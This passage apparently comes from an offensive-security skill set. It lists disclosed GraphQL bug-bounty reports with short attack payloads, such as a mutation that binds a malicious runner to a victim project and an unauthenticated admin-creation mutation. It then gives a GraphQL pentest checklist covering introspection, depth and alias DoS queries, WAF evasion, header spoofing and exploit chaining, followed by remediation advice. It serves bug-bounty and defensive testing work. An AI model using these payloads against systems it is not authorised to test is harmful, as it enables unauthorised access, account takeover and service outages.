    - Root cause: GraphQL field accepted a URL arg and dereferenced it without scheme/host allowlist
    - Year: 2023 — **$3,000**, 249 upvotes

10. **EXNESS — GraphQL attribute-batching DoS** ([H1 #2293642](https://hackerone.com/reports/2293642))
    - Subclass: DoS via batching / deep-attribute amplification on unauth endpoint
    - Payload: single HTTP request containing N batched operations, each requesting deeply nested attribute trees, sustained until origin OOM
    - Root cause: no query-depth, query-complexity, or batch-size limits on unauthenticated `/graphql`
    - Year: 2024 — bounty undisclosed (resolved)

11. **GitLab — Malicious-runner attach via `runnerUpdate` (CVE-2023-2478)** ([Advisory](https://about.gitlab.com/releases/2023/05/05/critical-security-release-gitlab-15-11-2-released/))
    - Subclass: auth bypass on mutation / project-scope missing
    - Payload: `mutation { runnerUpdate(input:{id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"]}) }`
    - Root cause: `runnerUpdate` did not check that the caller had Maintainer on the target project — any user could bind their malicious runner and intercept CI jobs (build secrets, code execution)
    - Year: 2023 — Critical, CVSS 9.6 (H1 bounty undisclosed; GitLab Critical-tier typically $20k–$35k)

12. **AS Watson — Auth bypass via unrestricted `createAdminUser` mutation** ([HackerOne blog](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass))
    - Subclass: sensitive mutation reachable without authentication (introspection-aided discovery)
    - Payload: `mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"…"}) { token } }` invoked unauthenticated after schema enumeration via introspection
    - Root cause: schema lacked per-field authorization directives; `createAdminUser` exposed to public role
    - Year: 2023 — "Best Bug" prize at HackerOne Ambassador World Cup

---

## Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.


### From `offensive-skills/offensive-graphql/SKILL.md`

## Metadata
- **Skill Name**: graphql-security
- **Folder**: offensive-graphql
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/graphql.md

## Description
GraphQL security testing checklist: introspection abuse, batching attacks, query depth/complexity DoS, field suggestion enumeration, IDOR via GraphQL, injection through arguments, authorization bypass. Use when assessing GraphQL endpoints in web app tests or bug bounty.

## Trigger Phrases
Use this skill when the conversation involves any of:
`GraphQL, introspection, batching attack, query depth, GraphQL injection, GraphQL IDOR, field suggestion, GraphQL auth bypass, GraphQL DoS, GraphQL security`

## Shortcut

1.  Identify GraphQL Endpoint: Look for common paths like `/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`. Check network requests in browser developer tools.
2.  Introspection Query: Send an introspection query to fetch the schema. Tools like GraphiQL or Postman can help. `query={__schema{types{name}}}`
3.  Analyze Schema: Look for sensitive types, fields, mutations, and subscriptions. Pay attention to authorization logic.
4.  Test Queries/Mutations:
    - Check for Information Disclosure (e.g., user data, configuration).
    - Test for Authorization Bypass (IDOR, insufficient permission checks).
    - Look for Injection (SQLi, NoSQLi, Command Injection) in input fields.
    - Test for Denial of Service (complex/deeply nested queries, batching abuse).
    - Explore Mutations for unintended state changes.
    - Check Subscriptions for data leakage.
    - Verify persisted/signed queries enforced in production; depth/complexity limits.
5.  No Introspection? Try common field/type guessing (e.g., `user`, `admin`, `query`, `mutation`). Use tools like `clairvoyance` or `inql`.

## Mechanisms

- Over-Fetching: Clients can request excessive data, potentially leading to DoS or information disclosure if not properly limited.
- Under-Fetching/N+1 Problem: Primarily a performance issue—poorly designed resolvers make dozens of backend calls (N+1). While not a direct data‑exposure risk, extreme latency can create timing side‑channels an attacker could measure.
- Insecure Direct Object References (IDOR): Exposing internal IDs allows attackers to potentially access unauthorized data by guessing/enumerating IDs.
- Insufficient Authorization: Missing or flawed checks on types, fields, mutations, or subscriptions.
- Input Validation Issues: Failure to sanitize or validate user input can lead to injection attacks (SQLi, NoSQLi, XSS, SSRF) if resolvers interact with backend systems insecurely.
- Introspection Enabled in Production: Exposes the entire schema, simplifying reconnaissance for attackers.
- Batching Abuse: Sending multiple queries/mutations in a single request can overwhelm the server (DoS) or bypass rate limiting.
- Lack of Depth/Complexity Limiting: Allows excessively nested or complex queries, leading to DoS.
- Directive Flooding: Sending thousands of `@include`/`@skip` directives in a single query can exhaust parser and validation phases, triggering DoS (e.g., CVE‑2024‑47614 in async‑graphql).
- Incremental Delivery: `@defer`/`@stream` can multiply work and leak partial data; must be guarded by cost and auth checks on deferred subtrees.
- File Uploads: Implementations using `graphql-upload` or custom multipart handling can inherit classic upload bugs (path traversal, content-type trust, temp file exposure).
- Federation/Gateway: Cross-subgraph authorization gaps, entity resolver overfetching, and inconsistent role enforcement at the router vs. subgraphs.
- CSRF Considerations: If cookie‑based auth is used, enforce header + `Origin` validation; prefer Authorization header.
- WebSocket Security: GraphQL subscriptions over WebSocket often lack proper authorization on long-lived connections; auth tokens in connection params may not be re-validated after expiry.
- Field Suggestions: Error messages that suggest valid field names when invalid ones are queried can leak schema information even with introspection disabled.
- Relay Global IDs: Base64-encoded `Type:ID` patterns (e.g., `base64("User:123")`) are commonly used and can be decoded to reveal internal IDs.
- Apollo/Hasura Leaks: Production Apollo Server instances may leak schema via query extensions; Hasura permissions misconfiguration can expose direct DB access.
- Header Injection: `x-hasura-*` headers or custom auth headers may be trusted without validation, enabling privilege escalation.

### Preparation

- Identify the GraphQL endpoint(s).
- Obtain the schema via introspection or guessing.
- Understand the application context and potential sensitive data/actions.

### Techniques

- Schema Analysis: Use tools like `GraphQL Voyager` or manually review the schema for sensitive keywords (`admin`, `password`, `config`, `secret`), authorization directives, and complex relationships.
- Query Fuzzing: Use tools like `inql` or custom scripts to fuzz queries, mutations, and arguments.
- Authorization Testing:
  - Try accessing data/mutations meant for higher-privileged users.
  - Test IDOR by replacing IDs in queries/mutations.
  - Check if different roles see different schema subsets (if applicable).
  - Verify router and subgraphs enforce identical authz decisions.
- Injection Testing: Inject payloads (SQL, NoSQL, OS command, XSS, SSRF) into string arguments.
- DoS Testing:
  - Deeply nested queries (`query { user { friends { friends { ... } } } }`).
  - Large limits in list arguments (`query { users(limit: 99999) { id } }`).
  - Query batching abuse.
  - Field duplication/aliases (`query { u1: user(id:1){id} u2: user(id:1){id} ... }`).
  - Directive flooding by attaching a very long chain of `@include` or `@skip` directives to safe fields.
- Incremental delivery pressure: attach many `@defer`/`@stream` segments to expand compute and memory footprint.
- Business Logic Flaws: Test mutations for race conditions, logical errors, or unintended side effects.
- Upload testing: multipart spec edge cases (path traversal via `map`, temp file exposure) and file‑type checks.
- WebSocket Subscription Testing:
  - Tamper with `connection_init` payload (JWT in `connectionParams`)
  - Test subscription flooding without rate limiting
  - Verify auth token expiry is enforced on long-lived WS connections
  - Test for cross-user subscription leaks via predictable subscription IDs
- Field Suggestion Probing: Send invalid field names and analyze error messages for schema hints ("Did you mean...?" responses)
- Relay ID Decoding: Identify base64-encoded global IDs (e.g., `id: "VXNlcjoxMjM="`), decode to extract type and numeric ID, test IDOR
- Apollo Extensions: Try `?extensions={"persistedQuery":{...}}` or check for `apollo-server-testing` header in responses
- Hasura Header Injection: Test `x-hasura-role`, `x-hasura-user-id`, `x-hasura-org-id` headers for authorization bypass

### Advanced Testing

- Reverse engineer client-side code making GraphQL requests.
- Analyze traffic between microservices if GraphQL is used internally.
- Test subscription endpoints for authorization issues and data leakage over time.

### Introspection Disabled

Use wordlists (SecLists has GraphQL lists) with tools like `clairvoyance` or `GraphQLmap` to guess types, fields, and arguments. Analyze client-side code for hints.

- Quick probe: `query { __typename }` often succeeds even when full introspection is disabled and confirms a GraphQL endpoint.

- Use wordlists (SecLists has GraphQL lists) with tools like `clairvoyance` or `GraphQLmap` to guess types, fields, and arguments. Analyze client-side code for hints.

### Rate Limiting/Complexity Limits

- Use aliases to request the same field multiple times within limits.
- Split complex queries into multiple smaller ones.
- Abuse batching if not properly limited.

### Web Application Firewalls (WAFs)

- Use GraphQL query variations (aliases, fragments, different whitespace).
- Encode payloads within strings.
- Leverage nested input objects if WAF only inspects top-level arguments.
- Abuse incremental delivery: place sensitive fields under `@defer` to evade naive complexity calculators.
- Persisted queries reduce WAF reliance; prefer signature enforcement at edge.

### Common Patterns

- Publicly exposed GraphiQL interface with introspection enabled.
- Mutations lacking proper authorization checks.
- Resolvers directly using user input in database queries or system commands.
- Fields returning sensitive information not intended for the user's role.
- Lack of query depth/complexity/limit controls.

### Specific Functions/Areas:

- `user`, `account`, `profile` types/queries (Information Disclosure, IDOR).
- `admin`, `settings`, `config` types/queries (Privilege Escalation).
- Mutations involving payments, data modification, or user management.
- Search functionalities (Injection).
- File upload mechanisms via mutations.
- Subscription endpoints.

### Tools

- Automated Scanners: `StackHawk`, `Invicti`, **Escape** (free SaaS tier), `Nuclei` (GraphQL templates).
- Introspection & Interaction: `GraphiQL`, `Postman`, `Altair GraphQL Client`, `Insomnia`.
- Schema Exploration: `GraphQL Voyager`.
- Exploitation/Fuzzing: `inql` (Burp Suite Extension), `GraphQLmap`, `clairvoyance`, **CrackQL** (JWT extraction from errors), **BatchQL** (batch query fuzzing), custom Python scripts (`requests` library).
- Proxy: Burp Suite, OWASP ZAP (to intercept and modify requests).
- Security Middleware: **GraphQL Armor** – production‑ready depth, alias and complexity limits for Apollo Server, Yoga, Envelop and more.
- Fingerprinting / Recon: **graphw00f** – identifies the underlying GraphQL implementation (Apollo, Yoga, Hasura, etc.) to tailor attacks.
- Security Auditing: **graphql-cop** – security auditing and configuration checking.
- Endpoint Discovery: `Graphinder` and wordlists for path guessing.
- Linters/Policy: `graphql-schema-linter`, `eslint-plugin-graphql`, and custom auth directives unit tests.

### Systematic Process

1.  Reconnaissance (Endpoint discovery, Schema retrieval/guessing).
2.  Schema Analysis (Identify key types, fields, mutations, auth).
3.  Authorization Testing (Role-based access, IDOR).
4.  Input Vulnerability Testing (Injection, XSS, SSRF in arguments).
5.  DoS Testing (Query complexity, batching, limits).
6.  Business Logic Testing (Mutation side-effects, race conditions).
7.  Subscription Testing (if applicable).

### High-Impact Targets

Mutations changing state (user roles, passwords, settings), queries accessing sensitive user data, administrative endpoints.

## Chaining and Escalation

- **IDOR + Mutation**: Discover an IDOR in a query, then use the leaked ID to modify another user's data via a mutation (e.g., change email/password).
- **Information Disclosure + Injection**: Leak database structure/version via a verbose error, then use that info to craft a targeted SQLi payload.
- **SSRF + Internal Endpoint**: Use an SSRF vulnerability in a resolver to interact with internal GraphQL endpoints or other services not directly accessible.
- **Authorization Bypass + Admin Mutation**: Gain access to an administrative mutation (e.g., `updateUserRole`) through flawed authorization, then escalate privileges.
- **XSS + Token Theft**: Inject XSS payload via a vulnerable field, steal authentication tokens from other users viewing the data.

## Remediation Recommendations

- Disable Introspection in Production: Prevent easy schema discovery.
- Implement Strict Authorization: Apply checks at the schema level (directives) and within resolvers for every field, type, mutation, and subscription based on user roles/permissions. Use context passed to resolvers.
- Input Validation & Sanitization: Validate all arguments against expected types, formats, and lengths. Sanitize input before using it in downstream systems (databases, commands). Use parameterized queries.
- Query Cost Analysis: Implement limits on query depth, complexity (e.g., maximum nodes or calculated cost), and amount (limit number of results).
- Rate Limiting: Limit the number of requests per user/IP, including batched queries.
- Persisted & Signed Queries: Enforce automatic persisted queries (APQ) with operation signatures to whitelist allowed operations and block unknown or modified queries.
- Secure Federation Gateways: Keep Apollo Router (or your GraphQL gateway) patched, validate supergraph composition, and enforce authorization at the gateway layer to prevent cross‑subgraph data leaks.
- Caching & CDN Hardening: If responses are cached, partition caches by the `Authorization` header (or disable caching) to avoid shared‑cache data leakage.
- Specific Field Exposure: Avoid exposing sensitive fields (`password`, `internal tokens`). Use dedicated Data Transfer Objects (DTOs) if necessary.
- Error Handling: Return generic error messages; avoid leaking stack traces or internal details.
- Regular Audits & Testing: Perform regular security reviews and penetration tests specifically targeting the GraphQL API.
- Use Security Headers: Apply standard web security headers (CSP, HSTS, etc.).
- Keep Libraries Updated: Ensure GraphQL server libraries and dependencies are patched.
- Incremental Delivery Controls: enforce cost accounting for `@defer`/`@stream`; ensure deferred subtrees still run full auth/visibility checks.
- File Upload Hygiene: if using GraphQL upload, re‑encode images, validate content by signature, and store outside web root; apply all controls from `file-upload.md`.
- Federation RBAC: centralize auth policy in schema directives evaluated at the gateway and in subgraphs; avoid trusting upstream filtering blindly.
